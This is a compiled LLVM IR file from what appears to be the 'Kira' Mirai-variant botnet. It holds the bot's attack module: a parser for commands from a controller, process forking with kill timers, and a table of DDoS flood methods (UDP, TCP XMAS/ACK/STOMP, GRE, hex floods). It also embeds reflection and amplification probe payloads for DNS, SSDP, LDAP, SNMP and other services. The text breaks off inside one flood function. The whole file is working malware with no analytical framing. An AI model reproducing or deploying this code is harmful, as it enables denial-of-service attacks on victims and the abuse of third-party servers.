; ModuleID = 'host/ir_O2/Kira.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.table_value = type { i8*, i16 }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.attack_xmas_data = type { i32, i32, i32, i16, i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }

@methods_len = local_unnamed_addr global i8 0, align 1
@methods = local_unnamed_addr global %struct.attack_method** null, align 8
@attack_ongoing = local_unnamed_addr global [1 x i32] zeroinitializer, align 4
@LOCAL_ADDR = common local_unnamed_addr global i32 0, align 4
@.str.1 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.2 = private unnamed_addr constant [31 x i8] c"\01\00\00\01\00\00\00\00\00\00\03www\06google\03com\00\00\01\00\01\00", align 1
@.str.3 = private unnamed_addr constant [31 x i8] c"\01\00\00\01\00\00\00\00\00\00\03www\06google\03com\00\00\05\00\01\00", align 1
@.str.4 = private unnamed_addr constant [41 x i8] c"r\FE\1D\13\00\00\00\00\00\00\00\02\00\01\86\A0\00\01\97|\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00", align 1
@.str.5 = private unnamed_addr constant [49 x i8] c"\D9\00\0A\FA\00\00\00\00\00\01\02\90\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\C5\02\04\EC\ECB\EE\92\00", align 1
@.str.6 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.7 = private unnamed_addr constant [61 x i8] c"0:\02\01\030\0F\02\02Ji\02\03\00\FF\E3\04\01\04\02\01\03\04\100\0E\04\00\02\01\00\02\01\00\04\00\04\00\04\000\12\04\00\04\00\A0\0C\02\027\F0\02\01\00\02\01\000\00\00", align 1
@.str.8 = private unnamed_addr constant [8 x i8] c"\00\01\00\02\00\01\00\00", align 1
@.str.9 = private unnamed_addr constant [52 x i8] c"0\84\00\00\00-\02\01\07c\84\00\00\00$\04\00\0A\01\00\0A\01\00\02\01\00\02\01d\01\01\00\87\0BobjectClass0\84\00\00\00\00\00", align 1
@.str.10 = private unnamed_addr constant [54 x i8] c"\02\01\00\06 \00\00\00\00\00\01\00.n\00\00\00\15service:service-agent\00\07 default\00\00\00\00\00", align 1
@.str.11 = private unnamed_addr constant [157 x i8] c"\00\11\223DUfw\00\00\00\00\00\00\00\00\01\10\02\00\00\00\00\00\00\00\00\C0\00\00\00\A4\00\00\00\01\00\00\00\01\00\00\00\98\01\01\00\04\03\00\00$\01\01\00\00\80\01\00\05\80\02\00\02\80\03\00\01\80\04\00\02\80\0B\00\01\00\0C\00\04\00\00\00\01\03\00\00$\02\01\00\00\80\01\00\05\80\02\00\01\80\03\00\01\80\04\00\02\80\0B\00\01\00\0C\00\04\00\00\00\01\03\00\00$\03\01\00\00\80\01\00\01\80\02\00\02\80\03\00\01\80\04\00\02\80\0B\00\01\00\0C\00\04\00\00\00\01\00", align 1
@.str.12 = private unnamed_addr constant [25 x i8] c"\01\01\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\10\00", align 1
@.str.13 = private unnamed_addr constant [24 x i8] c"\06\00\FF\07\00\00\00\00\00\00\00\00\00\09 \18\C8\81\008\8E\04\B5\00", align 1
@.str.14 = private unnamed_addr constant [31 x i8] c"SNQUERY: 127.0.0.1:AAAAAA:xsvr\00", align 1
@.str.15 = private unnamed_addr constant [15 x i8] c"8d\C1x\01\B8\9B\CB\8F\00\00\00\00\00\00", align 1
@.str.16 = private unnamed_addr constant [2 x i8] c"\02\00", align 1
@.str.17 = private unnamed_addr constant [31 x i8] c"\1E\00\010\02\FD\A8\E3\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00", align 1
@.str.18 = private unnamed_addr constant [174 x i8] c"M-SEARCH * HTTP/1.1\0D\0AHOST: 255.255.255.255:1900\0D\0AMAN: \22ssdp:discover\22\0D\0AMX: 1\0D\0AST: urn:dial-multiscreen-org:service:dial:1\0D\0AUSER-AGENT: Google Chrome/60.0.3112.90 Windows\0D\0A\0D\0A\00", align 1
@.str.19 = private unnamed_addr constant [47 x i8] c"\00\00\00\00\00\01\00\00\00\00\00\00\09_services\07_dns-sd\04_udp\05local\00\00\0C\00\01\00", align 1
@.str.20 = private unnamed_addr constant [182 x i8] c"xf4\BE\03\00\00\00\00\00\00\00\00\00\01\00\00\02x\BA\85\09TeamSpeak\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0AWindows XP\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\02\00\00\00 \00<\00\00\01\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\08nickname\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00", align 1
@.str.21 = private unnamed_addr constant [163 x i8] c"\05\CA\7F\16\9C\11\F9\89\00\00\00\00\02\9Dt\8BE\AA{\EF\B9\9E\FE\AD\08\19\BA\CFA\E0\16\A22l\F3\CF\F4\8E<D\83\C8\8DQEo\90\95#>\00\97+\1Cq\B2N\C0a\F1\D7o\C5~\F6HR\BF\82j\A2;e\AA\18z\178\C3\81'\C3G\FC\A75\BA\FC\0F\9D\9Dr$\9D\FC\02\17mk\B1-r\C6\E3\17\1C\95\D9i\99W\CE\DD\DF\05\DC\03\94V\04:\14\E5\AD\9A+\140:#\A3%\AD\E8\E69\8A\85*\C6\DF\E5]-\A0/]\9C\D7+$\FB\B0\9C\C2\BA\89\B4\1B\17\A2\B6\00", align 1
@hexPayload = local_unnamed_addr global i8* getelementptr inbounds ([1021 x i8], [1021 x i8]* @.str, i64 0, i64 0), align 8
@.str = private unnamed_addr constant [1021 x i8] c"/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A\00", align 1
@table = common local_unnamed_addr global [41 x %struct.table_value] zeroinitializer, align 16
@table_key = local_unnamed_addr global i32 -1287662771, align 4

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() local_unnamed_addr #0 {
  tail call fastcc void @add_attack(i8 zeroext 0, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_udpgeneric)
  tail call fastcc void @add_attack(i8 zeroext 1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_udpvse)
  tail call fastcc void @add_attack(i8 zeroext 4, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_udpplain)
  tail call fastcc void @add_attack(i8 zeroext 6, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_tcpxmas)
  tail call fastcc void @add_attack(i8 zeroext 7, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_nudp)
  tail call fastcc void @add_attack(i8 zeroext 2, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_tcpack)
  tail call fastcc void @add_attack(i8 zeroext 3, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_tcpstomp)
  tail call fastcc void @add_attack(i8 zeroext 5, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_std)
  tail call fastcc void @add_attack(i8 zeroext 8, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_gre_ip)
  tail call fastcc void @add_attack(i8 zeroext 9, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_stdhex)
  tail call fastcc void @add_attack(i8 zeroext 10, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_udphex)
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @add_attack(i8 zeroext, void (i8, %struct.attack_target*, i8, %struct.attack_option*)*) unnamed_addr #0 {
  %3 = tail call noalias i8* @calloc(i64 1, i64 16) #11
  %4 = getelementptr inbounds i8, i8* %3, i64 8
  store i8 %0, i8* %4, align 8
  %5 = bitcast i8* %3 to void (i8, %struct.attack_target*, i8, %struct.attack_option*)**
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %5, align 8
  %6 = load i8*, i8** bitcast (%struct.attack_method*** @methods to i8**), align 8
  %7 = load i8, i8* @methods_len, align 1
  %8 = zext i8 %7 to i64
  %9 = shl nuw nsw i64 %8, 3
  %10 = add nuw nsw i64 %9, 8
  %11 = tail call i8* @realloc(i8* %6, i64 %10) #11
  %12 = bitcast i8* %11 to %struct.attack_method**
  store i8* %11, i8** bitcast (%struct.attack_method*** @methods to i8**), align 8
  %13 = load i8, i8* @methods_len, align 1
  %14 = add i8 %13, 1
  store i8 %14, i8* @methods_len, align 1
  %15 = zext i8 %13 to i64
  %16 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %12, i64 %15
  %17 = bitcast %struct.attack_method** %16 to i8**
  store i8* %3, i8** %17, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) local_unnamed_addr #1

; Function Attrs: nounwind
declare noalias i8* @realloc(i8* nocapture, i64) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_kill_all() local_unnamed_addr #0 {
  %1 = load i32, i32* getelementptr inbounds ([1 x i32], [1 x i32]* @attack_ongoing, i64 0, i64 0), align 4
  %2 = icmp eq i32 %1, 0
  br i1 %2, label %5, label %3

; <label>:3:                                      ; preds = %0
  %4 = tail call i32 @kill(i32 %1, i32 9) #11
  br label %5

; <label>:5:                                      ; preds = %0, %3
  store i32 0, i32* getelementptr inbounds ([1 x i32], [1 x i32]* @attack_ongoing, i64 0, i64 0), align 4
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) local_unnamed_addr #0 {
  %3 = icmp ult i32 %1, 4
  br i1 %3, label %.thread80, label %4

; <label>:4:                                      ; preds = %2
  %5 = bitcast i8* %0 to i32*
  %6 = load i32, i32* %5, align 4
  %7 = tail call i32 @ntohl(i32 %6) #12
  %8 = icmp eq i32 %1, 4
  br i1 %8, label %.thread80, label %9

; <label>:9:                                      ; preds = %4
  %10 = getelementptr inbounds i8, i8* %0, i64 4
  %11 = load i8, i8* %10, align 1
  %12 = icmp eq i32 %1, 5
  br i1 %12, label %.thread80, label %13

; <label>:13:                                     ; preds = %9
  %14 = getelementptr inbounds i8, i8* %0, i64 5
  %15 = getelementptr inbounds i8, i8* %0, i64 6
  %16 = load i8, i8* %14, align 1
  %17 = add i32 %1, -6
  %18 = zext i8 %16 to i32
  %19 = icmp eq i8 %16, 0
  br i1 %19, label %.thread80, label %20

; <label>:20:                                     ; preds = %13
  %21 = sext i32 %17 to i64
  %22 = zext i8 %16 to i64
  %23 = mul nuw nsw i64 %22, 5
  %24 = icmp ult i64 %21, %23
  br i1 %24, label %.thread80, label %.lr.ph88.preheader

.lr.ph88.preheader:                               ; preds = %20
  %25 = tail call noalias i8* @calloc(i64 %22, i64 24) #11
  %26 = bitcast i8* %25 to %struct.attack_target*
  %27 = add nsw i32 %18, -1
  %28 = zext i32 %27 to i64
  %29 = mul nuw nsw i64 %28, 5
  %30 = add nuw nsw i64 %29, 11
  %scevgep = getelementptr i8, i8* %0, i64 %30
  %wide.trip.count = zext i8 %16 to i64
  %xtraiter = and i64 %wide.trip.count, 1
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph88.prol.loopexit, label %.lr.ph88.prol.preheader

.lr.ph88.prol.preheader:                          ; preds = %.lr.ph88.preheader
  br label %.lr.ph88.prol

.lr.ph88.prol:                                    ; preds = %.lr.ph88.prol.preheader
  %31 = bitcast i8* %15 to i32*
  %32 = load i32, i32* %31, align 4
  %33 = getelementptr inbounds i8, i8* %25, i64 16
  %34 = bitcast i8* %33 to i32*
  store i32 %32, i32* %34, align 4
  %35 = getelementptr inbounds i8, i8* %0, i64 10
  %36 = getelementptr inbounds i8, i8* %0, i64 11
  %37 = load i8, i8* %35, align 1
  %38 = getelementptr inbounds i8, i8* %25, i64 20
  store i8 %37, i8* %38, align 4
  %39 = bitcast i8* %25 to i16*
  store i16 2, i16* %39, align 4
  %40 = getelementptr inbounds i8, i8* %25, i64 4
  %41 = bitcast i8* %40 to i32*
  store i32 %32, i32* %41, align 4
  br label %.lr.ph88.prol.loopexit

.lr.ph88.prol.loopexit:                           ; preds = %.lr.ph88.preheader, %.lr.ph88.prol
  %indvars.iv91.unr = phi i64 [ 0, %.lr.ph88.preheader ], [ 1, %.lr.ph88.prol ]
  %.087.unr = phi i8* [ %15, %.lr.ph88.preheader ], [ %36, %.lr.ph88.prol ]
  %42 = icmp eq i8 %16, 1
  br i1 %42, label %._crit_edge, label %.lr.ph88.preheader.new

.lr.ph88.preheader.new:                           ; preds = %.lr.ph88.prol.loopexit
  br label %.lr.ph88

.lr.ph88:                                         ; preds = %.lr.ph88, %.lr.ph88.preheader.new
  %indvars.iv91 = phi i64 [ %indvars.iv91.unr, %.lr.ph88.preheader.new ], [ %indvars.iv.next92.1, %.lr.ph88 ]
  %.087 = phi i8* [ %.087.unr, %.lr.ph88.preheader.new ], [ %56, %.lr.ph88 ]
  %43 = bitcast i8* %.087 to i32*
  %44 = load i32, i32* %43, align 4
  %45 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 1
  store i32 %44, i32* %45, align 4
  %46 = getelementptr inbounds i8, i8* %.087, i64 4
  %47 = getelementptr inbounds i8, i8* %.087, i64 5
  %48 = load i8, i8* %46, align 1
  %49 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 2
  store i8 %48, i8* %49, align 4
  %50 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 0, i32 0
  store i16 2, i16* %50, align 4
  %51 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 0, i32 2, i32 0
  store i32 %44, i32* %51, align 4
  %indvars.iv.next92 = add nuw nsw i64 %indvars.iv91, 1
  %52 = bitcast i8* %47 to i32*
  %53 = load i32, i32* %52, align 4
  %54 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 1
  store i32 %53, i32* %54, align 4
  %55 = getelementptr inbounds i8, i8* %.087, i64 9
  %56 = getelementptr inbounds i8, i8* %.087, i64 10
  %57 = load i8, i8* %55, align 1
  %58 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 2
  store i8 %57, i8* %58, align 4
  %59 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 0, i32 0
  store i16 2, i16* %59, align 4
  %60 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 0, i32 2, i32 0
  store i32 %53, i32* %60, align 4
  %indvars.iv.next92.1 = add nsw i64 %indvars.iv91, 2
  %exitcond.1 = icmp eq i64 %indvars.iv.next92.1, %wide.trip.count
  br i1 %exitcond.1, label %._crit_edge.unr-lcssa, label %.lr.ph88

._crit_edge.unr-lcssa:                            ; preds = %.lr.ph88
  br label %._crit_edge

._crit_edge:                                      ; preds = %.lr.ph88.prol.loopexit, %._crit_edge.unr-lcssa
  %61 = mul nsw i32 %18, -5
  %62 = add i32 %17, %61
  %63 = icmp eq i32 %62, 0
  br i1 %63, label %.loopexit81.thread, label %64

; <label>:64:                                     ; preds = %._crit_edge
  %65 = load i8, i8* %scevgep, align 1
  %66 = icmp eq i8 %65, 0
  br i1 %66, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %64
  %67 = zext i8 %65 to i64
  %68 = tail call noalias i8* @calloc(i64 %67, i64 16) #11
  %69 = bitcast i8* %68 to %struct.attack_option*
  %70 = getelementptr inbounds i8, i8* %scevgep, i64 1
  %71 = add i32 %62, -1
  %72 = zext i8 %65 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %85
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %85 ]
  %.184 = phi i8* [ %70, %.lr.ph.preheader ], [ %91, %85 ]
  %.17583 = phi i32 [ %71, %.lr.ph.preheader ], [ %92, %85 ]
  %73 = icmp eq i32 %.17583, 0
  br i1 %73, label %.loopexit81.loopexit, label %74

; <label>:74:                                     ; preds = %.lr.ph
  %75 = load i8, i8* %.184, align 1
  %76 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %69, i64 %indvars.iv, i32 1
  store i8 %75, i8* %76, align 8
  %77 = icmp eq i32 %.17583, 1
  br i1 %77, label %.loopexit81.loopexit, label %78

; <label>:78:                                     ; preds = %74
  %79 = getelementptr inbounds i8, i8* %.184, i64 1
  %80 = getelementptr inbounds i8, i8* %.184, i64 2
  %81 = load i8, i8* %79, align 1
  %82 = add i32 %.17583, -2
  %83 = zext i8 %81 to i32
  %84 = icmp slt i32 %82, %83
  br i1 %84, label %.loopexit81.loopexit, label %85

; <label>:85:                                     ; preds = %78
  %86 = add nuw nsw i32 %83, 1
  %87 = zext i32 %86 to i64
  %88 = tail call noalias i8* @calloc(i64 %87, i64 1) #11
  %89 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %69, i64 %indvars.iv, i32 0
  store i8* %88, i8** %89, align 8
  tail call void @util_memcpy(i8* %88, i8* %80, i32 %83) #11
  %90 = zext i8 %81 to i64
  %91 = getelementptr inbounds i8, i8* %80, i64 %90
  %92 = sub nsw i32 %82, %83
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %93 = icmp slt i64 %indvars.iv.next, %72
  br i1 %93, label %.lr.ph, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %85
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %64
  %.070 = phi %struct.attack_option* [ null, %64 ], [ %69, %.loopexit.loopexit ]
  %94 = tail call i32* @__errno_location() #12
  store i32 0, i32* %94, align 4
  tail call void @attack_start(i32 %7, i8 zeroext %11, i8 zeroext %16, %struct.attack_target* %26, i8 zeroext %65, %struct.attack_option* %.070)
  br label %.loopexit81

.loopexit81.loopexit:                             ; preds = %.lr.ph, %74, %78
  br label %.loopexit81

.loopexit81:                                      ; preds = %.loopexit81.loopexit, %.loopexit
  %.171 = phi %struct.attack_option* [ %.070, %.loopexit ], [ %69, %.loopexit81.loopexit ]
  %95 = icmp eq i8* %25, null
  br i1 %95, label %96, label %.loopexit81.thread

.loopexit81.thread:                               ; preds = %._crit_edge, %.loopexit81
  %.17195 = phi %struct.attack_option* [ %.171, %.loopexit81 ], [ null, %._crit_edge ]
  %.07393 = phi i8 [ %65, %.loopexit81 ], [ undef, %._crit_edge ]
  tail call void @free(i8* nonnull %25) #11
  br label %96

; <label>:96:                                     ; preds = %.loopexit81, %.loopexit81.thread
  %.17196 = phi %struct.attack_option* [ %.171, %.loopexit81 ], [ %.17195, %.loopexit81.thread ]
  %.07394 = phi i8 [ %65, %.loopexit81 ], [ %.07393, %.loopexit81.thread ]
  %97 = icmp eq %struct.attack_option* %.17196, null
  br i1 %97, label %.thread80, label %98

; <label>:98:                                     ; preds = %96
  %99 = zext i8 %.07394 to i32
  tail call fastcc void @free_opts(%struct.attack_option* nonnull %.17196, i32 %99)
  br label %.thread80

.thread80:                                        ; preds = %2, %4, %9, %13, %20, %96, %98
  ret void
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) local_unnamed_addr #2

declare void @util_memcpy(i8*, i8*, i32) local_unnamed_addr #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) local_unnamed_addr #0 {
  %7 = tail call i32 @fork() #11
  %8 = icmp eq i32 %7, -1
  %9 = icmp sgt i32 %7, 0
  %or.cond = or i1 %8, %9
  br i1 %or.cond, label %10, label %11

; <label>:10:                                     ; preds = %6
  ret void

; <label>:11:                                     ; preds = %6
  %12 = tail call i32 @fork() #11
  switch i32 %12, label %.preheader [
    i32 -1, label %17
    i32 0, label %18
  ]

.preheader:                                       ; preds = %11
  %13 = load i8, i8* @methods_len, align 1
  %14 = icmp eq i8 %13, 0
  br i1 %14, label %.loopexit, label %.lr.ph

.lr.ph:                                           ; preds = %.preheader
  %15 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %16 = zext i8 %13 to i64
  br label %24

; <label>:17:                                     ; preds = %11
  tail call void @exit(i32 0) #13
  unreachable

; <label>:18:                                     ; preds = %11
  %19 = tail call i32 @sleep(i32 %0) #11
  %20 = tail call i32 @getppid() #11
  %21 = tail call i32 @kill(i32 %20, i32 9) #11
  tail call void @exit(i32 0) #13
  unreachable

; <label>:22:                                     ; preds = %24
  %23 = icmp slt i64 %indvars.iv.next, %16
  br i1 %23, label %24, label %.loopexit.loopexit

; <label>:24:                                     ; preds = %.lr.ph, %22
  %indvars.iv = phi i64 [ 0, %.lr.ph ], [ %indvars.iv.next, %22 ]
  %25 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %15, i64 %indvars.iv
  %26 = load %struct.attack_method*, %struct.attack_method** %25, align 8
  %27 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %26, i64 0, i32 1
  %28 = load i8, i8* %27, align 8
  %29 = icmp eq i8 %28, %1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  br i1 %29, label %30, label %22

; <label>:30:                                     ; preds = %24
  %31 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %26, i64 0, i32 0
  %32 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %31, align 8
  tail call void %32(i8 zeroext %2, %struct.attack_target* %3, i8 zeroext %4, %struct.attack_option* %5) #11
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %22
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader, %30
  tail call void @exit(i32 0) #13
  unreachable
}

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @free_opts(%struct.attack_option*, i32) unnamed_addr #0 {
  %3 = icmp eq %struct.attack_option* %0, null
  br i1 %3, label %11, label %.preheader

.preheader:                                       ; preds = %2
  %4 = icmp sgt i32 %1, 0
  br i1 %4, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  %wide.trip.count = zext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %9
  %indvars.iv = phi i64 [ %indvars.iv.next, %9 ], [ 0, %.lr.ph.preheader ]
  %5 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %0, i64 %indvars.iv, i32 0
  %6 = load i8*, i8** %5, align 8
  %7 = icmp eq i8* %6, null
  br i1 %7, label %9, label %8

; <label>:8:                                      ; preds = %.lr.ph
  tail call void @free(i8* nonnull %6) #11
  br label %9

; <label>:9:                                      ; preds = %.lr.ph, %8
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %9
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %10 = bitcast %struct.attack_option* %0 to i8*
  tail call void @free(i8* %10) #11
  br label %11

; <label>:11:                                     ; preds = %2, %._crit_edge
  ret void
}

; Function Attrs: nounwind
declare i32 @fork() local_unnamed_addr #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #4

declare i32 @sleep(i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @getppid() local_unnamed_addr #1

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option* nocapture readonly, i8 zeroext, i8* readnone) local_unnamed_addr #5 {
  %5 = icmp eq i8 %0, 0
  br i1 %5, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %4
  %6 = zext i8 %0 to i64
  br label %.lr.ph

; <label>:7:                                      ; preds = %.lr.ph
  %8 = icmp slt i64 %indvars.iv.next, %6
  br i1 %8, label %.lr.ph, label %.loopexit.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %7
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %7 ]
  %9 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %1, i64 %indvars.iv, i32 1
  %10 = load i8, i8* %9, align 8
  %11 = icmp eq i8 %10, %2
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  br i1 %11, label %12, label %7

; <label>:12:                                     ; preds = %.lr.ph
  %13 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %1, i64 %indvars.iv, i32 0
  %14 = load i8*, i8** %13, align 8
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %7
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %4, %12
  %.09 = phi i8* [ %14, %12 ], [ %3, %4 ], [ %3, %.loopexit.loopexit ]
  ret i8* %.09
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option* nocapture readonly, i8 zeroext, i32) local_unnamed_addr #0 {
  %5 = tail call i8* @attack_get_opt_str(i8 zeroext %0, %struct.attack_option* %1, i8 zeroext %2, i8* null)
  %6 = icmp eq i8* %5, null
  br i1 %6, label %9, label %7

; <label>:7:                                      ; preds = %4
  %8 = tail call i32 @util_atoi(i8* nonnull %5, i32 10) #11
  br label %9

; <label>:9:                                      ; preds = %4, %7
  %.0 = phi i32 [ %8, %7 ], [ %3, %4 ]
  ret i32 %.0
}

declare i32 @util_atoi(i8*, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option* nocapture readonly, i8 zeroext, i32) local_unnamed_addr #0 {
  %5 = tail call i8* @attack_get_opt_str(i8 zeroext %0, %struct.attack_option* %1, i8 zeroext %2, i8* null)
  %6 = icmp eq i8* %5, null
  br i1 %6, label %9, label %7

; <label>:7:                                      ; preds = %4
  %8 = tail call i32 @inet_addr(i8* nonnull %5) #11
  br label %9

; <label>:9:                                      ; preds = %4, %7
  %.0 = phi i32 [ %8, %7 ], [ %3, %4 ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_nudp(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca [22 x i8*], align 16
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 0
  store i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0), i8** %7, align 16
  %8 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 1
  %9 = tail call signext i8 @random_hex()
